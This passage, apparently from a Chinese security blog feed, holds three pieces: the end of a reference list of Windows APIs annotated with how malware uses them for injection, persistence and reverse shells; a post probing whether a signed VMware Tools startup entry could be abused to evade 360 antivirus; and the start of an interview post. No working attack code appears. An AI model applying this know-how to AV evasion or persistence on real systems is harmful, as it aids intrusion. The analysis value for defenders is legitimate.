<h4 id="WSAStartup"><a href="#WSAStartup" class="headerlink" title="WSAStartup"></a>WSAStartup</h4><p>用来初始化底层级别的网络功能，搜索此函数调用位置，经常是定位网络相关功能最简单的方法。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup">WSAStartup 函数 （winsock.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h3 id="注册与服务类"><a href="#注册与服务类" class="headerlink" title="注册与服务类"></a>注册与服务类</h3><h4 id="CreateService"><a href="#CreateService" class="headerlink" title="CreateService"></a>CreateService</h4><p>用来启动、停止、修改或发送一-个信 号到运行服务。如果恶意代码使用了它自己的恶意服务，你就需要分析实现服务的代码，来确定出调用的用意。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea">CreateServiceA function （winsvc.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="ControlService"><a href="#ControlService" class="headerlink" title="ControlService"></a>ControlService</h4><p>用来启动，停止，修改或发送一个信号到运行服务。如果恶意代码使用了他自己的恶意服务，你就需要分析实现服务的代码，来确定出调用的用意。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-controlservice">ControlService function （winsvc.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="OpenSCManager"><a href="#OpenSCManager" class="headerlink" title="OpenSCManager"></a>OpenSCManager</h4><p>打开一个到服务控制管理器的句柄。任何想要安装，修改或是控制一个服务的程序，都必须要调用这个函数，才能使用其他服务操纵函数</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagera">OpenSCManagerA function （winsvc.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegisterHotKey"><a href="#RegisterHotKey" class="headerlink" title="RegisterHotKey"></a>RegisterHotKey</h4><p>用来注册一个热键，当用户任意时刻输入一个特定键值组合时，注册热键句柄将会被通知，无论当用户输入键值组合时哪个窗口是活跃的，这个函数通常被间谍软件使用，使其在键值组合中输入前对用户保持隐藏。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerhotkey">RegisterHotKey function （winuser.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegOpenKey"><a href="#RegOpenKey" class="headerlink" title="RegOpenKey"></a>RegOpenKey</h4><p>打开一个注册表键值的句柄，来进行读写。修改注册表键值通常是软件在主机上进行持久化保存的一种方法。注册表也包含了完整的操作系统和应用程序配置信息。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeya">RegOpenKeyA 函数 （winreg.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="StartServiceCtrlDispatcher"><a href="#StartServiceCtrlDispatcher" class="headerlink" title="StartServiceCtrlDispatcher"></a>StartServiceCtrlDispatcher</h4><p>由服务使用来连接到服务管理控制进程的主线程。任何以服务方式运行的进程必须在启动后30秒内调用这个函数。在恶意代码中找到这个函数，可以知道他的功能应以服务方式运行。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicectrldispatchera">StartServiceCtrlDispatcherA function (winsvc.h) - Win32 apps | Microsoft Docs</a></p>
<h4 id="RegCloseKey"><a href="#RegCloseKey" class="headerlink" title="RegCloseKey"></a>RegCloseKey</h4><p>关闭指定注册表的键</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey">RegCloseKey 函数 （winreg.h） - Win32 应用程序|微软文档 (microsoft.com)</a></p>
<h4 id="RegCreateKey-RegCreateKeyEx"><a href="#RegCreateKey-RegCreateKeyEx" class="headerlink" title="RegCreateKey/RegCreateKeyEx"></a>RegCreateKey/RegCreateKeyEx</h4><p>创建指定的注册表项。如果注册表中已存在该项，则该函数将打开它。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeya">RegCreateKeyA function （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa">RegCreateKeyExA function （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegDeleteKey"><a href="#RegDeleteKey" class="headerlink" title="RegDeleteKey"></a>RegDeleteKey</h4><p>删除一个注册表项</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletekeya">RegDeleteKeyA function （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegDeleteValue"><a href="#RegDeleteValue" class="headerlink" title="RegDeleteValue"></a>RegDeleteValue</h4><p>用于删除一个键下的一个键值</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletevaluea">RegDeleteValueA 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegQueryValue"><a href="#RegQueryValue" class="headerlink" title="RegQueryValue"></a>RegQueryValue</h4><p>取得指定项或子项的默认（未命名）值</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexa">RegQueryValueExA 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegSetValue-RegSetValueEx"><a href="#RegSetValue-RegSetValueEx" class="headerlink" title="RegSetValue/RegSetValueEx"></a>RegSetValue/RegSetValueEx</h4><p>设置指定注册表项的默认值或未命名值的数据</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvaluea">RegSetValueA 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa">RegSetValueExA 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegQueryInfoKey"><a href="#RegQueryInfoKey" class="headerlink" title="RegQueryInfoKey"></a>RegQueryInfoKey</h4><p>查询有关注册表项的信息</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw">RegQueryInfoKeyW 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegEnumKey-RegEnumKeyEx"><a href="#RegEnumKey-RegEnumKeyEx" class="headerlink" title="RegEnumKey/RegEnumKeyEx"></a>RegEnumKey/RegEnumKeyEx</h4><p>获取指定的子键值</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenumkeya">RegEnumKeyA function （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegEnumValue"><a href="#RegEnumValue" class="headerlink" title="RegEnumValue"></a>RegEnumValue</h4><p>用来枚举指定项的值</p>
<p>[RegEnumValueA 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)](<a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenumvaluea#:~:text=The">https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenumvaluea#:~:text=The</a> winreg.h header defines RegEnumValue as an alias,mismatches that result in compilation or runtime errors.)</p>
<h4 id="RegLoadKey"><a href="#RegLoadKey" class="headerlink" title="RegLoadKey"></a>RegLoadKey</h4><p>从以前用RegSaveKey函数创建的一个文件里装载注册表信息</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadkeya">RegLoadKeyA 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegReplaceKey"><a href="#RegReplaceKey" class="headerlink" title="RegReplaceKey"></a>RegReplaceKey</h4><p>用一个磁盘文件保存的信息替换注册表信息；并创建一个备份，在其中包含当前注册表信息</p>
<p>[RegReplaceKeyA function （winreg.h） - Win32 apps |微软文档 (microsoft.com)](<a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regreplacekeya#:~:text=The">https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regreplacekeya#:~:text=The</a> winreg.h header defines RegReplaceKey as an alias,mismatches that result in compilation or runtime errors.)</p>
<h4 id="RegRestoreKey"><a href="#RegRestoreKey" class="headerlink" title="RegRestoreKey"></a>RegRestoreKey</h4><p>从一个磁盘文件恢复注册表信息</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regrestorekeya">RegRestoreKeyA function （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegSaveKey"><a href="#RegSaveKey" class="headerlink" title="RegSaveKey"></a>RegSaveKey</h4><p>将一个项以及它的所有子项都保存到一个磁盘文件</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsavekeya">RegSaveKeyA 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegConnectRegistry"><a href="#RegConnectRegistry" class="headerlink" title="RegConnectRegistry"></a>RegConnectRegistry</h4><p>访问远程系统的部分注册表</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regconnectregistrya">RegConnectRegistryA 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegNotifyChangeKeyValue"><a href="#RegNotifyChangeKeyValue" class="headerlink" title="RegNotifyChangeKeyValue"></a>RegNotifyChangeKeyValue</h4><p>使应用程序可以接收事件通知中指定的注册表项及其子项的更改</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regnotifychangekeyvalue">RegNotifyChangeKeyValue function （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RegUnloadKey"><a href="#RegUnloadKey" class="headerlink" title="RegUnloadKey"></a>RegUnloadKey</h4><p>卸载指定的项以及它的所有子项</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regunloadkeya">RegUnLoadKeyA 函数 （winreg.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h3 id="进程线程类"><a href="#进程线程类" class="headerlink" title="进程线程类"></a>进程线程类</h3><h4 id="AttachThreadInput"><a href="#AttachThreadInput" class="headerlink" title="AttachThreadInput"></a>AttachThreadInput</h4><p>把一个线程的输入消息连接到另外的线程，在一些情况下，自己的窗口没有输入焦点但是想要当前焦点窗口的键盘输入消息，可以使用Win32 API函数AttachThreadInput()来解决这个问题</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-attachthreadinput">AttachThreadInput 函数 （winuser.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h4><p>检查一个特定进程是否被调试。这个函数通常在一个反调试技术中被使用。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent">CheckRemoteDebuggerPresent function （debugapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="ConnectNamedPipe"><a href="#ConnectNamedPipe" class="headerlink" title="ConnectNamedPipe"></a>ConnectNamedPipe</h4><p>用来为进程间通信创建一个服务端管道，等待一个客户端管道连接进来。后门程序和反向shell经常使用此函数来简单的连接到一个命令控制服务器。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe">ConnectNamedPipe function （namedpipeapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h4><p>创建并启动一个新进程。经常用到的函数，需要多关注下参数</p>
<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/procthread/creating-processes">创建进程 - Win32 apps | Microsoft Docs</a></p>
<h4 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h4><p>创建一个远程线程。启动器和隐蔽性恶意代码通常使用这个函数，将代码注入到其他进程中执行。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread function （processthreadsapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="CreateToolhelp32Snapshot"><a href="#CreateToolhelp32Snapshot" class="headerlink" title="CreateToolhelp32Snapshot"></a>CreateToolhelp32Snapshot</h4><p>用来创建一个进程，堆空间，线程和模块的快照。恶意代码经常使用这个函数，在多个进程或线程之间传播感染</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot function （tlhelp32.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="EnumProcesses"><a href="#EnumProcesses" class="headerlink" title="EnumProcesses"></a>EnumProcesses</h4><p>用来在系统上枚举运行进程的函数，恶意代码经常枚举进程来找到一个可以注入的进程。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses">枚举进程函数 （psapi.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="IsWow64Process"><a href="#IsWow64Process" class="headerlink" title="IsWow64Process"></a>IsWow64Process</h4><p>由一个32位进程使用，来确定它是否运行在64位操作系统上</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wow64apiset/nf-wow64apiset-iswow64process">IsWow64Process function （wow64apiset.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="ZwQueryInformationProcess"><a href="#ZwQueryInformationProcess" class="headerlink" title="ZwQueryInformationProcess"></a>ZwQueryInformationProcess</h4><p>返回关于一个特定进程的不同信息。这个函数通常在反调试技术中被使用。</p>
<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/procthread/zwqueryinformationprocess">ZwQueryInformationProcess 函数 - Win32 apps | Microsoft Docs</a></p>
<h4 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h4><p>打开系统上运行其他进程的句柄。这个句柄可以被用来向其他进程内存中读写数据，或是注入代码到其他进程中。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess function （processthreadsapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="PeekNamedPipe"><a href="#PeekNamedPipe" class="headerlink" title="PeekNamedPipe"></a>PeekNamedPipe</h4><p>用来从一个命名管道中复制数据，而无须从管道中移除数据。这个函数在反向shell中很常用。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-peeknamedpipe">PeekNamedPipe 函数 （namedpipeapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="Process32First-Process32Next"><a href="#Process32First-Process32Next" class="headerlink" title="Process32First/Process32Next"></a>Process32First/Process32Next</h4><p>在调用CreateToolhelp32Snapshot之后，使用此函数和Process32Next来枚举进程。恶意代码通常枚举进程，来找到一个可以注入的进程。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first">进程32第一个函数 （tlhelp32.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="ReadProcessMemory"><a href="#ReadProcessMemory" class="headerlink" title="ReadProcessMemory"></a>ReadProcessMemory</h4><p>用来从远程进程中读取内存。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory">ReadProcessMemory function （memoryapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="ResumeThread"><a href="#ResumeThread" class="headerlink" title="ResumeThread"></a>ResumeThread</h4><p>继续之前挂起的线程。此函数在几种注入技术中都会被使用。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">ResumeThread 函数 （processthreadsapi.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h4><p>修改给定线程的上下文，一些注入技术会使用这个函数</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext function （processthreadsapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="ShellExecute"><a href="#ShellExecute" class="headerlink" title="ShellExecute"></a>ShellExecute</h4><p>用来执行另一个程序，如果恶意代码创建了一个新的进程，需要分析这个新进程。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea">ShellExecuteA function （shellapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="SuspendThread"><a href="#SuspendThread" class="headerlink" title="SuspendThread"></a>SuspendThread</h4><p>挂起一个线程，使得他停止运行。恶意代码有时会挂起一个线程，通过代码注入技术来修改它。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread">SuspendThread function （processthreadsapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="Thread32First"><a href="#Thread32First" class="headerlink" title="Thread32First"></a>Thread32First</h4><p>用来查询一个进程的所有线程。注入器会使用这些函数来找出可供注入的合适线程。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first">Thread32First 函数 （tlhelp32.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="Thread32Next"><a href="#Thread32Next" class="headerlink" title="Thread32Next"></a>Thread32Next</h4><p>返回进程中下一个线程的信息</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next">Thread32Next 函数 （tlhelp32.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="WinExec"><a href="#WinExec" class="headerlink" title="WinExec"></a>WinExec</h4><p>运行指定的程序</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec 函数 （winbase.h） - Win32 应用|微软文档 (microsoft.com)</a></p>
<h4 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h4><p>用来向远程进程写数据的函数，恶意代码在进程注入中会用到此函数。入口区必须可以访问，否则操作将失败</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory function （memoryapi.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RpcServrRegisterIf"><a href="#RpcServrRegisterIf" class="headerlink" title="RpcServrRegisterIf"></a>RpcServrRegisterIf</h4><p>注册与RPC运行时库的接口。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverregisterif3">RpcServerRegisterIf3 函数 （rpcdce.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RpcServerListen"><a href="#RpcServerListen" class="headerlink" title="RpcServerListen"></a>RpcServerListen</h4><p>指示RPC运行时库来监听远程过程调用</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverlisten">RpcServerListen function （rpcdce.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RpcServerUseProtseqEp"><a href="#RpcServerUseProtseqEp" class="headerlink" title="RpcServerUseProtseqEp"></a>RpcServerUseProtseqEp</h4><p>告诉RPC运行时库使用指定的协议序列与指定的端点组合来接收远程过程调用。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserveruseprotseqep">RpcServerUseProtseqEp function （rpcdce.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RpcMgmtStopServerListening"><a href="#RpcMgmtStopServerListening" class="headerlink" title="RpcMgmtStopServerListening"></a>RpcMgmtStopServerListening</h4><p>告诉服务端停止对RPC的监听</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcmgmtstopserverlistening">RpcMgmtStopServerListening function （rpcdce.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RpcServerUnregisterIf"><a href="#RpcServerUnregisterIf" class="headerlink" title="RpcServerUnregisterIf"></a>RpcServerUnregisterIf</h4><p>从RPC运行时库注册表中删除一个接口</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcserverunregisterif">RpcServerUnregisterIf function （rpcdce.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h4 id="RpcStringBindingCompose"><a href="#RpcStringBindingCompose" class="headerlink" title="RpcStringBindingCompose"></a>RpcStringBindingCompose</h4><p>创建一个字符串绑定句柄。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcompose">RpcStringBindingCompose function （rpcdce.h） - Win32 apps |微软文档 (microsoft.com)</a></p>
<h3 id="注入类"><a href="#注入类" class="headerlink" title="注入类"></a>注入类</h3><h4 id="GetThreadContext"><a href="#GetThreadContext" class="headerlink" title="GetThreadContext"></a>GetThreadContext</h4><p>返回一个给定线程的上下文结构。线程上下文结构中存储了所有线程信息，比如寄存器值和目前状态。</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">GetThreadContext function (processthreadsapi.h) - Win32 apps | Microsoft Docs</a></p>
<h4 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h4><p>一个内存分配的例程，支持在远程进程中分配内存。恶意代码有时会在进程注入中使用 VirtualAllocEx函数。</p>
<h4 id="VirtualProtectEx"><a href="#VirtualProtectEx" class="headerlink" title="VirtualProtectEx"></a>VirtualProtectEx</h4><p>修改一个内存区域的保护机制，恶意代码可能会使用这个函数来将一块只读的内存节修改为可执行代码。</p>
<h4 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h4><p>用来在其他线程中执行代码，恶意代码有时会使用这个函数注入代码到其他进程。</p>
<p>参考链接:</p>
<p><a href="http://blog.nsfocus.net/malware-sample-analysis-api/">http://blog.nsfocus.net/malware-sample-analysis-api/</a></p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>木马分析</category>
      </categories>
      <tags>
        <tag>检索</tag>
        <tag>辅助文档</tag>
      </tags>
  </entry>
  <entry>
    <title>某启动项进程分析</title>
    <url>/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周六晚上，本来打开电影网站准备看电影的时候，haya师傅发来张图，说这个 exe 在添加进启动项的时候，360没有拦截，就想着我们能不能也利用下。</p>
<p>先说结论：分析后我个人感觉利用难度较大，价值不高，如果有师傅可以成功利用的话，请疯狂call我！！！</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227214139577.png" alt="image-20220227214139577"></p>
<p>首先我的第一反应是白加黑，但很快被当头一棒，不能想当然。还是要老老实实分析，切忌主观臆断。</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227214801798.png" alt="image-20220227214801798"></p>
<p>先了解下这个程序，看到这里喜忧参半，看描述似乎确实有木马伪装成这个程序，但这个程序有签名。</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227214929880.png" alt="image-20220227214929880"></p>
<p>下面要做的就是分析这个程序的加载方式了，这里我选择的火绒剑来监控。</p>
<p>首先删除这个注册表项，然后重装vmtools，安装完成后，<code>某启动项进程分析</code>会被写进启动项。我们做的就是分析安装过程中，该值是如何被写进注册表的。</p>
<p>删除该项</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227220152336.png" alt="image-20220227220152336"></p>
<p>重装vmtools</p>
<p>火绒剑监控注册表</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227220323220.png" alt="image-20220227220323220"></p>
<p>安装完成导出日志就好了，这里导出有18m，9w行的日志…….</p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227220801003.png" alt="image-20220227220801003"></p>
<p>这里个人感觉没必要全部都看，里面很多日志都是重复的。而且在不一定可以利用的情况下，首先搞清楚技术点才最重要。</p>
<p>看到这里是调用 <code>Msiexec.exe</code>来进行安装，查了一下 <code>Msiexec.exe</code>，在安装程序时都会调用该程序，emm这里先不管</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227221025013.png" alt="image-20220227221025013"></p>
<p>不知道为什么还涉及到了java…</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227221426992.png" alt="image-20220227221426992"></p>
<p>看到这里已经不报希望了，涉及到了硬件的操作…</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227221508737.png" alt="image-20220227221508737"></p>
<p>RDP session，难道还涉及 RDP协议？</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227221807148.png" alt="image-20220227221807148"></p>
<p>又有信任证书的问题</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227222108514.png" alt="image-20220227222108514"></p>
<p>可能是监测局域网吧，毕竟是在虚拟机中</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227222137298.png" alt="image-20220227222137298"></p>
<p>调用Wshshell， <code>wscript</code>对象可以创建两个COM对象，<code>WshShell</code>和 <code>WshNetwork</code>。这里倒是可以理解，毕竟 WshShell可以实现注册表的读写操作，</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227222141471.png" alt="image-20220227222141471"></p>
<p>这里也能明白，vmtools安装的时候是一个自解压包</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227222144950.png" alt="image-20220227222144950"></p>
<p>在安装的时候调用很多驱动</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227223008834.png" alt="image-20220227223008834"></p>
<p>加密签名</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227223150151.png" alt="image-20220227223150151"></p>
<p>这里就不明白了，怎么还有TCP/IP的接口……</p>
<p><img src="/2022/02/27/%E6%9F%90%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/image-20220227223758930.png" alt="image-20220227223758930"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看到这里差不多了，一言难尽，总之看着就不好利用，原因如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.某启动项进程分析 这个程序本身有加密签名</span><br><span class="line">2.安装过程中有驱动操作</span><br><span class="line">3.校验了证书完整性</span><br><span class="line">4.复杂的tcpip、winsock操作...这里没看懂</span><br><span class="line">5........</span><br></pre></td></tr></table></figure>

<p>这里限于作者水平有限，抛砖引玉。</p>
<p>如果有师傅研究出利用方法，请疯狂call我！</p>
]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>持久化</tag>
        <tag>进程分析</tag>
      </tags>
  </entry>
  <entry>
    <title>某甲方安全工程师校招面试</title>
    <url>/2021/09/14/%E6%9F%90%E6%89%8B%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%A0%A1%E6%8B%9B%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<p>这是第一次面严格意义上的甲方，知识面学到了很多，问题也很不一样</p>
